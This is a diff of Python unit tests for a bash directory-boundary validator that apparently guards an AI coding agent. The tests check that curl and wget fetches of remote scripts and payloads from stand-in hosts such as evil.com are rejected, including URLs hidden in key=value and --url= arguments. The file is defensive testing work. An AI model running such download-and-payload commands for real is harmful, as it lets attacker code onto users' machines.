@@ -327,6 +327,58 @@ class TestCheckBashDirectoryBoundary:
         assert not valid
         assert "/etc/cron.d/evil" in error
 
+    def test_curl_url_argument_is_rejected(self) -> None:
+        """A URL fetch can't be validated against the boundary; reject it.
+
+        ``(cwd / 'https://evil.com').resolve()`` lands *inside* cwd as a literal
+        subdir, so the plain path check would wrongly pass the URL. Network
+        commands with a scheme:// argument must be blocked outright.
+        """
+        valid, error = check_bash_directory_boundary(
+            "curl https://evil.com/x.sh", self.cwd, self.approved
+        )
+        assert not valid
+        assert "boundary" in error.lower()
+
+    def test_wget_url_argument_is_rejected(self) -> None:
+        valid, error = check_bash_directory_boundary(
+            "wget http://1.2.3.4/payload -O out.bin", self.cwd, self.approved
+        )
+        assert not valid
+        assert "boundary" in error.lower()
+
+    def test_curl_local_file_inside_boundary_passes(self) -> None:
+        """curl with a local path inside the boundary is not a URL fetch."""
+        valid, error = check_bash_directory_boundary(
+            "curl ./local.txt", self.cwd, self.approved
+        )
+        assert valid
+        assert error is None
+
+    def test_curl_url_hidden_in_key_value_is_rejected(self) -> None:
+        """A URL on the value side of key=value must also be blocked.
+
+        The scheme check runs on the whole token first (misses ``url=https://``),
+        so after the ``=`` split the value must be re-checked for a scheme.
+        """
+        valid, error = check_bash_directory_boundary(
+            "curl url=https://evil.com/x.sh", self.cwd, self.approved
+        )
+        assert not valid
+        assert "boundary" in error.lower()
+
+    def test_curl_url_in_long_option_is_rejected(self) -> None:
+        """A URL in a ``--opt=URL`` long option must be blocked too.
+
+        Flag tokens are skipped before the scheme/key=value checks, so the
+        ``--url=https://…`` form would otherwise slip through.
+        """
+        valid, error = check_bash_directory_boundary(
+            "curl --url=https://evil.com/x.sh", self.cwd, self.approved
+        )
+        assert not valid
+        assert "boundary" in error.lower()
+
 
 class TestIsClaudeInternalPath:
     """Test the _is_claude_internal_path helper function."""
